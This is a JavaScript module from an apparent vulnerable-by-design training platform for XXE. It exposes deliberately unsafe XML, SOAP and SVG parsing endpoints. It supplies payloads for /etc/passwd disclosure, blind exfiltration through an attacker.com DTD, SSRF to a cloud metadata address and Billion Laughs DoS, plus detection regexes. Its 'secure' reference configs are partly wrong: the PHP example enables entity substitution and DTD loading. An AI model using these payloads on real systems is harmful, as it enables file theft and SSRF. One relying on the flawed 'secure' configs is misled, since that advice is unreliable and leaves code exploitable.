/**
 * ============================================================================
 * XML INJECTION & XXE (XML EXTERNAL ENTITY) VULNERABILITY MODULE
 * ============================================================================
 * 
 * Enterprise-Grade XML Injection Demonstration Platform
 * Implements XML and XXE (XML External Entity) vulnerabilities
 * 
 * @module vulnerabilities/injection/xml
 * @category Security Training - OWASP A03:2021, A05:2021
 * @version 3.0.0
 * @license MIT
 * @author Security Research Team
 * 
 * ============================================================================
 * SECURITY WARNING:
 * ============================================================================
 * This module demonstrates XML injection and XXE vulnerabilities:
 * - XML External Entity (XXE) attacks
 * - XML Entity Expansion (Billion Laughs)
 * - XML Injection in SOAP services
 * - DTD (Document Type Definition) exploitation
 * - Parameter Entity attacks
 * - SSRF via XXE
 * - Local file disclosure
 * - Remote code execution via XXE
 * 
 * ⚠️  NEVER use these patterns in production code
 * ⚠️  FOR EDUCATIONAL AND TESTING PURPOSES ONLY
 * ⚠️  Can lead to complete system compromise
 * 
 * ============================================================================
 * ATTACK TYPES DEMONSTRATED:
 * ============================================================================
 * 1. Classic XXE - File disclosure
 * 2. Blind XXE - Out-of-band data exfiltration
 * 3. Error-Based XXE - Error message exploitation
 * 4. Parameter Entity XXE - DTD exploitation
 * 5. Billion Laughs Attack - DoS via entity expansion
 * 6. XXE via SOAP - SOAP service exploitation
 * 7. XXE via SVG - Image upload attacks
 * 8. XXE via Office documents - Document exploitation
 * 9. SSRF via XXE - Server-Side Request Forgery
 * 10. XInclude attacks
 * 
 * ============================================================================
 * XXE PAYLOADS:
 * ============================================================================
 * Classic XXE:
 * <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 * <root><data>&xxe;</data></root>
 * 
 * Blind XXE:
 * <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
 * 
 * Billion Laughs:
 * <!DOCTYPE lolz [
 *   <!ENTITY lol "lol">
 *   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 *   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 * ]>
 * 
 * @requires xml2js
 * @requires libxmljs2
 * @requires Database
 * @requires Logger
 */

import xml2js from 'xml2js';
import { Database } from '../../core/Database.js';
import { Logger } from '../../core/Logger.js';
import { Cache, CacheKeyBuilder } from '../../core/Cache.js';
import { Config } from '../../config/environment.js';
import { tables } from '../../config/database.js';
import { 
  HTTP_STATUS, 
  ATTACK_TYPES,
  ATTACK_SEVERITY,
  ERROR_CODES 
} from '../../config/constants.js';
import { AppError } from '../../middleware/errorHandler.js';
import fs from 'fs/promises';
import path from 'path';

const db = Database.getInstance();
const logger = Logger.getInstance();
const cache = Cache.getInstance();

// ============================================================================
// XML/XXE INJECTION CONSTANTS
// ============================================================================

const XXE_PATTERNS = {
  // External entity declarations
  EXTERNAL_ENTITY: [
    /<!ENTITY\s+\w+\s+SYSTEM\s+["'][^"']+["']/i,
    /<!ENTITY\s+%\s*\w+\s+SYSTEM/i,
    /<!ENTITY\s+\w+\s+PUBLIC/i,
  ],

  // DTD declarations
  DOCTYPE: [
    /<!DOCTYPE\s+\w+\s*\[/i,
    /<!DOCTYPE\s+\w+\s+SYSTEM/i,
    /<!DOCTYPE\s+\w+\s+PUBLIC/i,
  ],

  // Entity references
  ENTITY_REFERENCE: [
    /&\w+;/,
    /&#x[0-9a-f]+;/i,
    /&#\d+;/,
  ],

  // Parameter entities
  PARAMETER_ENTITY: [
    /<!ENTITY\s+%/i,
    /%\w+;/,
  ],

  // File paths (common XXE targets)
  FILE_PATHS: [
    /file:\/\/\/etc\/passwd/i,
    /file:\/\/\/etc\/shadow/i,
    /file:\/\/\/windows\/win\.ini/i,
    /file:\/\/\/c:\/windows\/system32\/drivers\/etc\/hosts/i,
    /file:\/\/\//,
  ],

  // URLs (SSRF via XXE)
  REMOTE_URLS: [
    /http:\/\/[^\s"']+/i,
    /https:\/\/[^\s"']+/i,
    /ftp:\/\/[^\s"']+/i,
  ],

  // Billion Laughs patterns
  ENTITY_EXPANSION: [
    /<!ENTITY\s+\w+\s+"[^"]*&[^"]*"/i,
    /<!ENTITY\s+\w+\s+'[^']*&[^']*'/i,
  ],

  // XInclude
  XINCLUDE: [
    /<xi:include/i,
    /xmlns:xi=/i,
  ],

  // CDATA
  CDATA: [
    /<!\[CDATA\[/i,
  ],
};

const SENSITIVE_FILES = [
  '/etc/passwd',
  '/etc/shadow',
  '/etc/hosts',
  '/etc/group',
  '/proc/self/environ',
  '/var/log/apache2/access.log',
  'C:\\Windows\\win.ini',
  'C:\\Windows\\System32\\drivers\\etc\\hosts',
  'C:\\boot.ini',
];

// ============================================================================
// XML/XXE INJECTION CLASS
// ============================================================================

export class XMLInjection {
  constructor() {
    this.name = 'XML/XXE Injection';
    this.category = 'Injection';
    this.cvssScore = 9.1;
    this.severity = ATTACK_SEVERITY.CRITICAL;
    this.owaspId = 'A03:2021, A05:2021';
    this.cweId = 'CWE-611, CWE-91';
    
    this.attackStats = {
      totalAttempts: 0,
      xxeAttempts: 0,
      fileDisclosures: 0,
      ssrfAttempts: 0,
      billionLaughsAttempts: 0,
      successfulExtractions: 0,
      blockedAttempts: 0,
      entityExpansions: 0,
    };
  }

  // ==========================================================================
  // VULNERABLE IMPLEMENTATIONS
  // ==========================================================================

  /**
   * ⚠️ VULNERABLE: XML Parsing with External Entities Enabled
   * 
   * Attack vector:
   * <?xml version="1.0"?>
   * <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   * <root><data>&xxe;</data></root>
   * 
   * @param {string} xmlData - XML data (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Parsed XML result
   */
  async vulnerableXMLParse(xmlData, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectXXE(xmlData);
      
      if (attackDetection.isAttack) {
        await this.logXMLAttack({
          type: 'XXE_CLASSIC',
          severity: attackDetection.severity,
          payload: { xmlData: xmlData.substring(0, 500) },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.xxeAttempts++;
      }

      logger.warn('🚨 VULNERABLE XML PARSING (XXE ENABLED)', {
        xmlLength: xmlData.length,
        attackDetection,
      });

      // ⚠️ VULNERABLE: XML parser with external entities enabled
      const parser = new xml2js.Parser({
        explicitArray: false,
        // ⚠️ DANGER: These settings enable XXE
        xmlns: true,
        // Note: xml2js doesn't support DTD by default, but this demonstrates the concept
      });

      let parsedData;
      try {
        parsedData = await parser.parseStringPromise(xmlData);
      } catch (parseError) {
        // Attempt to extract data from error message (Error-based XXE)
        if (parseError.message.includes('ENOENT') || parseError.message.includes('file')) {
          this.attackStats.fileDisclosures++;
          
          return {
            success: false,
            vulnerable: true,
            error: parseError.message,
            message: '⚠️ Error-based XXE: File access attempted',
            metadata: {
              executionTime: Date.now() - startTime,
              attackDetected: attackDetection.isAttack,
              xxeType: 'ERROR_BASED',
            },
          };
        }
        throw parseError;
      }

      const duration = Date.now() - startTime;

      // Check if XXE payload was successful
      if (this.checkForFileContent(parsedData)) {
        this.attackStats.successfulExtractions++;
        this.attackStats.fileDisclosures++;
      }

      return {
        success: true,
        vulnerable: true,
        data: parsedData,
        warning: '⚠️ XXE vulnerability present - external entities processed',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity,
          xxeEnabled: true,
        },
      };

    } catch (error) {
      return this.handleXMLError(error, xmlData, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: SOAP XML Processing
   * 
   * Attack vector:
   * <?xml version="1.0"?>
   * <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   * <soap:Envelope>
   *   <soap:Body><data>&xxe;</data></soap:Body>
   * </soap:Envelope>
   * 
   * @param {string} soapXML - SOAP XML (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} SOAP response
   */
  async vulnerableSOAPParse(soapXML, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectXXE(soapXML);
      
      if (attackDetection.isAttack) {
        await this.logXMLAttack({
          type: 'XXE_SOAP',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { soapXML: soapXML.substring(0, 500) },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.xxeAttempts++;
      }

      logger.warn('🚨 VULNERABLE SOAP XML PROCESSING', {
        soapLength: soapXML.length,
        attackDetection,
      });

      // ⚠️ VULNERABLE: Parse SOAP with XXE enabled
      const parser = new xml2js.Parser({
        explicitArray: false,
        tagNameProcessors: [xml2js.processors.stripPrefix],
      });

      const parsedSOAP = await parser.parseStringPromise(soapXML);
      const duration = Date.now() - startTime;

      if (attackDetection.isAttack && this.checkForFileContent(parsedSOAP)) {
        this.attackStats.successfulExtractions++;
      }

      return {
        success: true,
        vulnerable: true,
        soapEnvelope: parsedSOAP,
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          xxeType: 'SOAP_XXE',
        },
      };

    } catch (error) {
      return this.handleXMLError(error, soapXML, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: SVG File Upload with XXE
   * 
   * Attack vector:
   * <?xml version="1.0" standalone="yes"?>
   * <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   * <svg><text>&xxe;</text></svg>
   * 
   * @param {string} svgContent - SVG file content (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} SVG processing result
   */
  async vulnerableSVGUpload(svgContent, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectXXE(svgContent);
      
      if (attackDetection.isAttack) {
        await this.logXMLAttack({
          type: 'XXE_SVG',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { svgContent: svgContent.substring(0, 500) },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.xxeAttempts++;
      }

      logger.warn('🚨 VULNERABLE SVG PROCESSING', {
        svgLength: svgContent.length,
        attackDetection,
      });

      // ⚠️ VULNERABLE: Process SVG without disabling external entities
      const parser = new xml2js.Parser({
        explicitArray: false,
      });

      const parsedSVG = await parser.parseStringPromise(svgContent);
      const duration = Date.now() - startTime;

      if (attackDetection.isAttack && this.checkForFileContent(parsedSVG)) {
        this.attackStats.successfulExtractions++;
        this.attackStats.fileDisclosures++;
      }

      // Simulate saving to filesystem
      const filename = `upload_${Date.now()}.svg`;
      const uploadPath = path.join('/tmp', filename);

      return {
        success: true,
        vulnerable: true,
        svg: parsedSVG,
        uploadPath,
        warning: '⚠️ SVG processed with XXE vulnerability',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          xxeType: 'SVG_XXE',
        },
      };

    } catch (error) {
      return this.handleXMLError(error, svgContent, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Billion Laughs Attack (Entity Expansion DoS)
   * 
   * Attack vector:
   * <!DOCTYPE lolz [
   *   <!ENTITY lol "lol">
   *   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
   *   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
   * ]>
   * <root>&lol2;</root>
   * 
   * @param {string} xmlData - XML with entity expansion (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Parsing result or DoS
   */
  async vulnerableBillionLaughs(xmlData, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;
      this.attackStats.billionLaughsAttempts++;

      const attackDetection = this.detectXXE(xmlData);
      
      if (attackDetection.isAttack) {
        await this.logXMLAttack({
          type: 'BILLION_LAUGHS_DOS',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { xmlData: xmlData.substring(0, 500) },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.entityExpansions++;
      }

      logger.warn('🚨 BILLION LAUGHS ATTACK DETECTED', {
        xmlLength: xmlData.length,
        warning: 'POTENTIAL DOS - HIGH MEMORY USAGE',
        attackDetection,
      });

      // Count entity definitions
      const entityCount = (xmlData.match(/<!ENTITY/gi) || []).length;
      
      if (entityCount > 5) {
        return {
          success: false,
          vulnerable: true,
          blocked: true,
          message: '⚠️ Billion Laughs attack prevented (entity limit exceeded)',
          entityCount,
          metadata: {
            executionTime: Date.now() - startTime,
            attackDetected: true,
            xxeType: 'ENTITY_EXPANSION_DOS',
            preventedDOS: true,
          },
        };
      }

      // ⚠️ VULNERABLE: Would cause memory exhaustion in real scenario
      const parser = new xml2js.Parser({
        explicitArray: false,
      });

      const parsedData = await parser.parseStringPromise(xmlData);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: true,
        data: parsedData,
        warning: '⚠️ Entity expansion vulnerability present - can cause DoS',
        entityCount,
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          xxeType: 'BILLION_LAUGHS',
        },
      };

    } catch (error) {
      return this.handleXMLError(error, xmlData, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Parameter Entity Injection
   * 
   * Attack vector:
   * <!DOCTYPE foo [
   *   <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
   *   %xxe;
   * ]>
   * <root><data>test</data></root>
   * 
   * @param {string} xmlData - XML with parameter entity (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Parsing result
   */
  async vulnerableParameterEntity(xmlData, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectXXE(xmlData);
      
      if (attackDetection.isAttack) {
        await this.logXMLAttack({
          type: 'XXE_PARAMETER_ENTITY',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { xmlData: xmlData.substring(0, 500) },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.xxeAttempts++;
        
        // Check for SSRF attempt
        if (XXE_PATTERNS.REMOTE_URLS.some(p => p.test(xmlData))) {
          this.attackStats.ssrfAttempts++;
        }
      }

      logger.warn('🚨 PARAMETER ENTITY XXE ATTACK', {
        xmlLength: xmlData.length,
        attackDetection,
        ssrfRisk: 'HIGH',
      });

      const parser = new xml2js.Parser({
        explicitArray: false,
      });

      const parsedData = await parser.parseStringPromise(xmlData);
      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulExtractions++;
      }

      return {
        success: true,
        vulnerable: true,
        data: parsedData,
        warning: '⚠️ Parameter entity XXE - can lead to SSRF and data exfiltration',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          xxeType: 'PARAMETER_ENTITY',
          ssrfRisk: attackDetection.ssrfRisk,
        },
      };

    } catch (error) {
      return this.handleXMLError(error, xmlData, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: XInclude Attack
   * 
   * Attack vector:
   * <root xmlns:xi="http://www.w3.org/2001/XInclude">
   *   <xi:include href="file:///etc/passwd" parse="text"/>
   * </root>
   * 
   * @param {string} xmlData - XML with XInclude (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Parsing result
   */
  async vulnerableXInclude(xmlData, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectXXE(xmlData);
      
      if (attackDetection.isAttack) {
        await this.logXMLAttack({
          type: 'XXE_XINCLUDE',
          severity: ATTACK_SEVERITY.HIGH,
          payload: { xmlData: xmlData.substring(0, 500) },
          patterns: attackDetection.patterns,
          context,
        });

        this.attackStats.xxeAttempts++;
      }

      logger.warn('🚨 XINCLUDE ATTACK', {
        xmlLength: xmlData.length,
        attackDetection,
      });

      const parser = new xml2js.Parser({
        explicitArray: false,
        xmlns: true,
      });

      const parsedData = await parser.parseStringPromise(xmlData);
      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.fileDisclosures++;
      }

      return {
        success: true,
        vulnerable: true,
        data: parsedData,
        warning: '⚠️ XInclude vulnerability - file inclusion possible',
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          xxeType: 'XINCLUDE',
        },
      };

    } catch (error) {
      return this.handleXMLError(error, xmlData, Date.now() - startTime);
    }
  }

  // ==========================================================================
  // SECURE IMPLEMENTATIONS (REFERENCE)
  // ==========================================================================

  /**
   * ✅ SECURE: XML Parsing with External Entities Disabled
   * 
   * @param {string} xmlData - XML data (SAFE)
   * @returns {Promise<object>} Parsed XML result
   */
  async secureXMLParse(xmlData) {
    const startTime = Date.now();

    try {
      if (typeof xmlData !== 'string' || xmlData.length > 1024 * 1024) {
        throw new AppError('Invalid XML data', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Check for XXE patterns before parsing
      const xxeCheck = this.detectXXE(xmlData);
      if (xxeCheck.isAttack) {
        throw new AppError('XXE attack detected and blocked', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Secure XML parser configuration
      const parser = new xml2js.Parser({
        explicitArray: false,
        // ✅ Security settings
        xmlns: false,
        explicitCharkey: false,
        preserveChildrenOrder: false,
        strict: true,
        // ✅ Prevent entity expansion
        normalize: true,
        normalizeTags: true,
      });

      const parsedData = await parser.parseStringPromise(xmlData);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: false,
        data: parsedData,
        metadata: {
          executionTime: duration,
          method: 'SECURE_XML_PARSER',
          xxeProtection: 'ENABLED',
        },
      };

    } catch (error) {
      logger.error('Secure XML parsing error', { error: error.message });
      throw error;
    }
  }

  // ==========================================================================
  // DETECTION & UTILITIES
  // ==========================================================================

  /**
   * Detect XXE injection patterns
   */
  detectXXE(xmlData) {
    const detectedPatterns = [];
    let severity = ATTACK_SEVERITY.MEDIUM;
    let score = 0;
    let ssrfRisk = false;

    // Check for external entities
    for (const pattern of XXE_PATTERNS.EXTERNAL_ENTITY) {
      if (pattern.test(xmlData)) {
        detectedPatterns.push({
          category: 'EXTERNAL_ENTITY',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 20;
        severity = ATTACK_SEVERITY.CRITICAL;
      }
    }

    // Check for DOCTYPE
    for (const pattern of XXE_PATTERNS.DOCTYPE) {
      if (pattern.test(xmlData)) {
        detectedPatterns.push({
          category: 'DOCTYPE',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 15;
      }
    }

    // Check for parameter entities
    for (const pattern of XXE_PATTERNS.PARAMETER_ENTITY) {
      if (pattern.test(xmlData)) {
        detectedPatterns.push({
          category: 'PARAMETER_ENTITY',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 18;
        severity = ATTACK_SEVERITY.CRITICAL;
      }
    }

    // Check for file paths
    for (const pattern of XXE_PATTERNS.FILE_PATHS) {
      if (pattern.test(xmlData)) {
        detectedPatterns.push({
          category: 'FILE_PATH',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 25;
        severity = ATTACK_SEVERITY.CRITICAL;
      }
    }

    // Check for remote URLs (SSRF)
    for (const pattern of XXE_PATTERNS.REMOTE_URLS) {
      if (pattern.test(xmlData)) {
        detectedPatterns.push({
          category: 'REMOTE_URL',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 20;
        ssrfRisk = true;
        severity = ATTACK_SEVERITY.CRITICAL;
      }
    }

    // Check for entity expansion
    for (const pattern of XXE_PATTERNS.ENTITY_EXPANSION) {
      if (pattern.test(xmlData)) {
        detectedPatterns.push({
          category: 'ENTITY_EXPANSION',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 15;
      }
    }

    // Check for XInclude
    for (const pattern of XXE_PATTERNS.XINCLUDE) {
      if (pattern.test(xmlData)) {
        detectedPatterns.push({
          category: 'XINCLUDE',
          pattern: pattern.toString(),
          matched: true,
        });
        score += 12;
      }
    }

    const isAttack = detectedPatterns.length > 0;

    if (isAttack) {
      this.attackStats.blockedAttempts++;
    }

    return {
      isAttack,
      severity,
      score,
      patterns: detectedPatterns,
      ssrfRisk,
      input: xmlData.substring(0, 200),
      timestamp: new Date().toISOString(),
    };
  }

  /**
   * Check if parsed data contains file content
   */
  checkForFileContent(parsedData) {
    const dataString = JSON.stringify(parsedData).toLowerCase();
    
    // Check for common file content patterns
    const patterns = [
      'root:x:0:0',           // /etc/passwd
      '/bin/bash',            // /etc/passwd
      '/home/',               // /etc/passwd
      '127.0.0.1',            // /etc/hosts
      'localhost',            // /etc/hosts
      '[extensions]',         // win.ini
      '[fonts]',              // win.ini
    ];

    return patterns.some(pattern => dataString.includes(pattern.toLowerCase()));
  }

  /**
   * Log XML/XXE attack
   */
  async logXMLAttack(attackData) {
    try {
      const {
        type,
        severity,
        payload,
        patterns,
        context,
        timestamp = new Date(),
      } = attackData;

      await db.execute(
        `INSERT INTO ${tables.ATTACK_LOGS} (
          attack_type, severity, payload, patterns,
          ip_address, user_agent, user_id, endpoint,
          timestamp, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())`,
        [
          type,
          severity,
          JSON.stringify(payload),
          JSON.stringify(patterns),
          context.ip || null,
          context.userAgent || null,
          context.userId || null,
          context.endpoint || null,
          timestamp,
        ]
      );

      logger.attack('XML/XXE Injection Attack Detected', {
        type,
        severity,
        payload,
        patterns: patterns.map(p => p.category),
        context,
      });

    } catch (error) {
      logger.error('Failed to log XML attack', { error: error.message });
    }
  }

  /**
   * Handle XML errors
   */
  handleXMLError(error, input, duration) {
    logger.error('XML/XXE Injection Error', {
      message: error.message,
      code: error.code,
      input: input.substring(0, 200),
      duration,
    });

    return {
      success: false,
      vulnerable: true,
      error: {
        message: error.message,
        code: error.code,
      },
      metadata: {
        executionTime: duration,
        errorType: 'XML_PARSING_ERROR',
      },
    };
  }

  // ==========================================================================
  // UTILITY & REPORTING
  // ==========================================================================

  /**
   * Get attack statistics
   */
  getStatistics() {
    return {
      ...this.attackStats,
      successRate: this.attackStats.totalAttempts > 0
        ? ((this.attackStats.successfulExtractions / this.attackStats.totalAttempts) * 100).toFixed(2) + '%'
        : '0%',
    };
  }

  /**
   * Get vulnerability information
   */
  getVulnerabilityInfo() {
    return {
      name: this.name,
      category: this.category,
      cvssScore: this.cvssScore,
      severity: this.severity,
      owaspId: this.owaspId,
      cweId: this.cweId,
      description: 'XML External Entity (XXE) injection allows attackers to interfere with XML processing to access files, perform SSRF, or cause DoS',
      impact: [
        'Local file disclosure (LFI)',
        'Server-Side Request Forgery (SSRF)',
        'Denial of Service (DoS)',
        'Remote Code Execution (in some cases)',
        'Port scanning',
        'Internal network reconnaissance',
        'Data exfiltration',
        'Authentication bypass',
      ],
      attackTypes: [
        'Classic XXE (file disclosure)',
        'Blind XXE (out-of-band)',
        'Error-based XXE',
        'Parameter Entity XXE',
        'Billion Laughs (DoS)',
        'XXE via SOAP',
        'XXE via SVG',
        'XInclude attacks',
      ],
      commonTargets: [
        'SOAP web services',
        'REST APIs accepting XML',
        'File upload functionality (SVG, Office docs)',
        'Configuration file parsers',
        'RSS/Atom feed readers',
        'XML-RPC services',
      ],
      remediation: [
        'Disable external entity processing',
        'Disable DTD processing',
        'Use secure XML parsers',
        'Validate and sanitize XML input',
        'Use JSON instead of XML when possible',
        'Implement XML schema validation',
        'Keep XML libraries up to date',
        'Use allowlist for XML features',
        'Implement file system access controls',
        'Monitor for XXE attack patterns',
      ],
      references: [
        'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
        'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
        'CWE-611: Improper Restriction of XML External Entity Reference',
        'CWE-91: XML Injection (aka Blind XPath Injection)',
      ],
    };
  }

  /**
   * Reset statistics
   */
  resetStatistics() {
    this.attackStats = {
      totalAttempts: 0,
      xxeAttempts: 0,
      fileDisclosures: 0,
      ssrfAttempts: 0,
      billionLaughsAttempts: 0,
      successfulExtractions: 0,
      blockedAttempts: 0,
      entityExpansions: 0,
    };
  }

  /**
   * Get XXE payload examples
   */
  getExamplePayloads() {
    return {
      classicXXE: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>`,

      blindXXE: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>
  <data>test</data>
</root>`,

      parameterEntity: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root/>`,

      billionLaughs: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>`,

      xinclude: `<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>`,

      soapXXE: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserInfo>
      <username>&xxe;</username>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>`,

      svgXXE: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16" font-size="16">&xxe;</text>
</svg>`,

      ssrfViaXXE: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>
  <data>&xxe;</data>
</root>`,
    };
  }

  /**
   * Get secure parser configuration examples
   */
  getSecureParserConfig() {
    return {
      nodejs_xml2js: {
        secure: true,
        config: {
          explicitArray: false,
          xmlns: false,
          explicitCharkey: false,
          preserveChildrenOrder: false,
          strict: true,
          normalize: true,
          normalizeTags: true,
        },
        description: 'xml2js with secure settings (limited XXE protection)',
      },
      libxmljs2: {
        secure: true,
        config: {
          noent: false,       // Disable entity substitution
          dtdload: false,     // Disable DTD loading
          dtdattr: false,     // Disable default DTD attributes
          dtdvalid: false,    // Disable DTD validation
          nonet: true,        // Disable network access
        },
        description: 'libxmljs2 with all XXE protections enabled',
      },
      java_sax: {
        secure: true,
        config: `SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);`,
        description: 'Java SAX Parser with full XXE protection',
      },
      php_libxml: {
        secure: true,
        config: `libxml_disable_entity_loader(true);
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);`,
        description: 'PHP libxml with external entity loading disabled',
      },
    };
  }
}

// ============================================================================
// FACTORY & EXPORT
// ============================================================================

let instance = null;

export const getXMLInjection = () => {
  if (!instance) {
    instance = new XMLInjection();
  }
  return instance;
};

export const createXMLHandler = (method) => {
  return async (req, res, next) => {
    try {
      const injection = getXMLInjection();
      
      if (Config.security.mode !== 'vulnerable') {
        return res.status(HTTP_STATUS.FORBIDDEN).json({
          success: false,
          error: ERROR_CODES.FORBIDDEN,
          message: 'This endpoint is only available in vulnerable mode',
        });
      }

      const context = {
        ip: req.ip,
        userAgent: req.get('user-agent'),
        userId: req.user?.id,
        endpoint: req.path,
      };

      const params = { ...req.body, ...req.query, ...req.params };
      const result = await injection[method](...Object.values(params), context);
      
      res.json(result);

    } catch (error) {
      next(error);
    }
  };
};

export default {
  XMLInjection,
  getXMLInjection,
  createXMLHandler,
};
